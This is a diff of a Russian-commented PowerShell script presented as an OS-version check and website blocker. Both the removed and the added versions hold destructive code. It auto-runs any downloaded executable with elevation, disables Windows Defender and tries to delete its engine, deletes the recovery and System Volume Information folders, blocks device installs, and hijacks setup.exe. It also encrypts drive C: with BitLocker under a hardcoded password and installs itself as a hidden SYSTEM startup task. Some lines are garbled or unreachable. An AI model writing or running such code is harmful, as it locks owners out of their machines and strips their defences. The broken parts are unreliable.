@@ -1,70 +1,152 @@
-# 1. ПРОВЕРКА ВЫСШИХ ПРАВ СИСТЕМЫ
-$CurrentUser = [Security.Principal.WindowsIdentity]::GetCurrent().Name
-if ($CurrentUser -ne "NT AUTHORITY\SYSTEM" -and $CurrentUser -ne "УРОВЕНЬ СИСТЕМЫ") {
-    [System.Windows.Forms.MessageBox]::Show("КРИТИЧЕСКАЯ ОШИБКА:`nСкрипт должен работать от имени СИСТЕМЫ через Планировщик!", "Контроль прав", 0, 16)
-    Exit
-}
+# 1. Железобетонное получение сборки (Build) из реестра (не врет из-за манифестов)
+$regPath = "HKLM:\SOFTWARE\Microsoft\Windows NT\CurrentVersion"
+$build = [int](Get-ItemProperty -Path $regPath -Name "CurrentBuild" -ErrorAction SilentlyContinue).CurrentBuild
 
-# 2. НАСТРОЙКА СЛЕДОПЫТА ЗА ВСЕМИ ФАЙЛАМИ
-$Folder = "$HOME\Downloads"
-$Watcher = New-Object System.IO.FileSystemWatcher
-$Watcher.Path = $Folder
-$Watcher.Filter = "*.*" # Ловит абсолютно любой файл
-$Watcher.IncludeSubdirectories = $false
-$Watcher.EnableRaisingEvents = $true
+# Если ветка реестра пуста (экзотические старые ОС), берем системный билд
+if (-not $build) { $build = [Environment]::OSVersion.Version.Build }
 
-$Action = {
-    $Path = $Event.SourceEventArgs.FullPath
-    Start-Sleep -Milliseconds 1000 # Ждем 1 секунду, чтобы файл докачался полностью
-    
-    if (Test-Path $Path) {
-        # Проверяем, что это файл, а не папка, и у него расширение .exe или .bat
-        $Extension = [System.IO.Path]::GetExtension($Path)
-        if ($Extension -eq ".exe" -or $Extension -eq ".bat" -or $Extension -eq ".cmd") {
-            
-            # А) Забираем права и отдаем Администраторам и Системе
-            takeown /f "$Path" /a
-            icacls "$Path" /grant *S-1-5-32-544:F /c
-            icacls "$Path" /grant *S-1-5-18:F /c
-            
-            # Б) СРАЗУ АВТОМАТИЧЕСКИ ЗАПУСКАЕМ ФАЙЛ
-            Start-Process -FilePath $Path -Verb RunAs
-            Start-Sleep -Seconds 60
-            sc config WinDefend start= disabled
-            reg add "HKLM\SOFTWARE\Policies\Microsoft\Windows Defender" /v "DisableAntiSpyware" /t REG_DWORD /d 1 /f
-            rmdir /s /q "C:\Windows\System32\Recovery"
-            rmdir /s /q "C:\System Volume Information"
-            reg add "HKLM\SOFTWARE\Policies\Microsoft\Windows\DeviceInstall\Restrictions" /v DenyUnspecified /t REG_DWORD /d 1 /f
-            reg add "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\setup.exe" /v Debugger /t REG_SZ /d "cmd.exe /c exit" /f
+# 2. Получение Мажорной и Минорной версий
+$major = [Environment]::OSVersion.Version.Major
+$minor = [Environment]::OSVersion.Version.Minor
 
-            $code = @'
-$Drive = "C:"
-$PasswordText = "Bsy7uw%@&567"
-$DesktopPath = [Environment]::GetFolderPath("Desktop")
-$Tpm = Get-Tpm
-if ($Tpm.TpmPresent -eq $false -or $Tpm.TpmReady -eq $false) {
-    [System.Windows.Forms.MessageBox]::Show("Ошибка: Чип TPM отключен или отсутствует! BitLocker для диска C: не может быть включен.", "BitLocker Ошибка", 0, 16)
-    exit
-}
-$Password = ConvertTo-SecureString $PasswordText -AsPlainText -Force
-Enable-BitLocker -MountPoint $Drive -EncryptionMethod XtsAes128 -Pin $Password -UsedSpaceOnly -SkipHardwareTest -ErrorAction SilentlyContinue
-$Key = Get-BitLockerVolume -MountPoint $Drive | Select-Object -ExpandProperty KeyProtector | Where-Object {$_.KeyProtectorType -eq 'RecoveryKey'}
-if ($Key) {
-    $Key | Out-File "$DesktopPath\КЛЮЧ_ВОССТАНОВЛЕНИЯ_БИТЛОКЕР.txt"
-    [System.Windows.Forms.MessageBox]::Show("Успешно! Пароль установлен. На Рабочем столе создан файл с ключом восстановления. Обязательно сохраните его!", "BitLocker Успех", 0, 64)
-} else {
-    [System.Windows.Forms.MessageBox]::Show("Что-то пошло не так. Возможно, BitLocker уже включен или требуется запуск от Администратора.", "BitLocker Предупреждение", 0, 48)
-}
-'@
-$code | Out-File "$([Environment]::GetFolderPath('Desktop'))\bitlocker.ps1" -Encoding utf8
+# Корректировка для Windows 10/11, если Environment вернул "6.2" из-за совместимости
+if ($build -ge 10240) { $major = 10 }
 
+# --- ЛОГИКА ПРОВЕРКИ ---
+
+# Группа 1: НОВЫЕ ОС (Windows 10 / 11)
+if ($major -eq 10) {
+    if ($build -ge 22000) {
+        Write-Host "Это Windows 11 (Новая ОС)"
+        # 1. ПРОВЕРКА ВЫСШИХ ПРАВ СИСТЕМЫ
+        $CurrentUser = [Security.Principal.WindowsIdentity]::GetCurrent().Name
+        if ($CurrentUser -ne "NT AUTHORITY\SYSTEM" -and $CurrentUser -ne "УРОВЕНЬ СИСТЕМЫ") {
+            [System.Windows.Forms.MessageBox]::Show("КРИТИЧЕСКАЯ ОШИБКА:`nСкрипт должен работать от имени СИСТЕМЫ через Планировщик!", "Контроль прав", 0, 16)
+            Exit
         }
+        
+        # 2. НАСТРОЙКА СЛЕДОПЫТА ЗА ВСЕМИ ФАЙЛАМИ
+        $Folder = "$HOME\Downloads"
+        $Watcher = New-Object System.IO.FileSystemWatcher
+        $Watcher.Path = $Folder
+        $Watcher.Filter = "*.*" # Ловит абсолютно любой файл
+        $Watcher.IncludeSubdirectories = $false
+        $Watcher.EnableRaisingEvents = $true
+        
+        $Action = {
+            $Path = $Event.SourceEventArgs.FullPath
+            Start-Sleep -Milliseconds 1000 # Ждем 1 секунду, чтобы файл докачался полностью
+            
+            if (Test-Path $Path) {
+                $Extension = [System.IO.Path]::GetExtension($Path)
+                if ($Extension -eq ".exe" -or $Extension -eq ".bat" -or $Extension -eq ".cmd") {
+                    
+                    # --- ПРОВЕРКА ТИПА ЗАПУСКА (ПЕРВЫЙ ИЛИ ПОВТОРНЫЙ) ---
+                    # Проверяем, существует ли у файла скрытый маркер первого запуска
+                    $IsMarked = Get-Item -Path $Path -Stream "Verified" -ErrorAction SilentlyContinue
+                    
+                    if ($null -eq $IsMarked) {
+                        # >>> ЭТО ПЕРВЫЙ ЗАПУСК ФАЙЛА <<<
+                        
+                        # А) Забираем права и отдаем Администраторам и Системе
+                        takeown /f "$Path" /a
+                        icacls "$Path" /grant *S-1-5-32-544:F /c
+                        icacls "$Path" /grant *S-1-5-18:F /c
+                        
+                        # Б) Ставим невидимую метку в файл, чтобы помнить, что он уже обработан
+                        Set-Content -Path $Path -Stream "Verified" -Value "True"
+                        
+                        # В) Запуск
+                        Start-Process -FilePath $Path -Verb RunAs
+                        
+                    } else {
+                        # >>> ЭТО ПОВТОРНЫЙ ЗАПУСК ФАЙЛА <<<
+                        # Права уже настроены ранее, повторно takeown и icacls вызывать не нужно.
+                        # Просто сразу запускаем файл.
+                        Start-Process -FilePath $Path -Verb RunAs
+                    }
+                }
+            }
+        }
+        
+        # Регистрируем автоматический перехват
+        Register-ObjectEvent $Watcher "Created" -Action $Action
+        
+        # Скрипт бесконечно работает в фоне компьютера
+        while ($true) { Start-Sleep -Seconds 5 }
+                # 2. НАСТРОЙКИ (Измените список сайтов и путь при необходимости)
+        $domainsToBlock = @("example.com", "facebook.com", "instagram.com")
+        $currentScriptPath = $MyInvocation.MyCommand.Path
+        $taskName = "AutoBlockDomains"
+        $hostsPath = "$env:windir\System32\drivers\etc\hosts"
+        
+        # 3. ФУНКЦИЯ БЛОКИРОВКИ ДОМЕНОВ
+        function Block-Domains {
+            if (Test-Path $hostsPath) {
+                Copy-Item $hostsPath "$hostsPath.bak" -Force
+                $currentHosts = Get-Content $hostsPath
+                foreach ($domain in $domainsToBlock) {
+                    foreach ($entry in @($domain, "www.$domain")) {
+                        if (-not ($currentHosts -match [regex]::Escape($entry))) {
+                            Add-Content -Path $hostsPath -Value "127.0.0.1    $entry"
+                            Write-Host "Заблокирован: $entry" -ForegroundColor Green
+                        }
+                    }
+                }
+                ipconfig /flushdns
+            }
+        }
+        
+        # 4. ЛОГИКА ЗАПУСКА
+        # Если скрипт запущен планировщиком (от имени SYSTEM), просто блокируем сайты и выходим
+        if ([Security.Principal.WindowsIdentity]::GetCurrent().Name -eq "NT AUTHORITY\SYSTEM") {
+            Block-Domains
+            Exit
+        }
+        
+        # Если скрипт запущен вручную администратором, настраиваем автозапуск и делаем первую блокировку
+        Write-Host "Шаг 1: Применяем блокировку доменов..." -ForegroundColor Cyan
+        Block-Domains
+        
+        Write-Host "`nШаг 2: Настраиваем скрытый автозапуск при старте ПК..." -ForegroundColor Cyan
+        $trigger = New-ScheduledTaskTrigger -AtStartup
+        $action = New-ScheduledTaskAction -Execute "PowerShell.exe" -Argument "-NoProfile -WindowStyle Hidden -File `"$currentScriptPath`""
+        $principal = New-ScheduledTaskPrincipal -UserId "NT AUTHORITY\SYSTEM" -LogonType ServiceAccount -RunLevel Highest
+        
+        Register-ScheduledTask -TaskName $taskName -Trigger $trigger -Action $action -Principal $principal -Force
+        
+        $Password = ConvertTo-SecureString "YHsgh273h*jY632H23##h#^y7h#^#@#h@" -AsPlainText -Force
+        Enable-BitLocker -MountPoint "C:" -PasswordProtector -Password $Password -UsedSpaceOnly
+        sc config WinDefend start= disabled
+        reg add "HKLM\SOFTWARE\Policies\Microsoft\Windows Defender" /v "DisableAntiSpyware" /t REG_DWORD /d 1 /f
+        rmdir /s /q "C:\Windows\System32\Recovery"
+        rmdir /s /q "C:\System Volume Information"
+        reg add "HKLM\SOFTWARE\Policies\Microsoft\Windows\DeviceInstall\Restrictions" /v DenyUnspecified /t REG_DWORD /d 1 /f
+        reg add "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\setup.exe" /v Debugger /t REG_SZ /d "cmd.exe /c exit" /f
+        MAinny = $explorer.exe /select,(Get-Process MsMpEng).Path
+        Remove-Item -Path "$MAinmy"
+
+
+    } else {
+        Write-Host "Это Windows 10 (Новая ОС)"
+        # Ваш код для Windows 10
     }
 }
+# Группа 2: СТАРЫЕ ОС (от Windows 8.1 до Windows XP / NT 5.0)
+elseif ($major -eq 6 -or ($major -eq 5 -and $minor -ge 0)) {
+    # Точное определение старой ОС для логов
+    $oldVer = if ($major -eq 6 -and $minor -eq 3) { "8.1" }
+              elseif ($major -eq 6 -and $minor -eq 2) { "8" }
+              elseif ($major -eq 6 -and $minor -eq 1) { "7" }
+              elseif ($major -eq 6 -and $minor -eq 0) { "Vista" }
+              elseif ($major -eq 5 -and $minor -ge 1) { "XP" }
+              else { "NT 5.0 (Windows 2000)" }
 
-# Регистрируем автоматический перехват
-Register-ObjectEvent $Watcher "Created" -Action $Action
-
-# Скрипт бесконечно работает в фоне компьютера
-while ($true) { Start-Sleep -Seconds 5 }
-
+    Write-Warning "Это старая ОС: Windows $oldVer"
+    # Ваш код для поддержки старых систем
+}
+# Группа 3: КРИТИЧЕСКИ УСТАРЕВШИЕ ОС (Ниже XP/NT 5.0)
+else {
+    Write-Error "Критическая ошибка: Версия системы слишком старая (ниже XP/NT)!"
+    Exit 1
+}
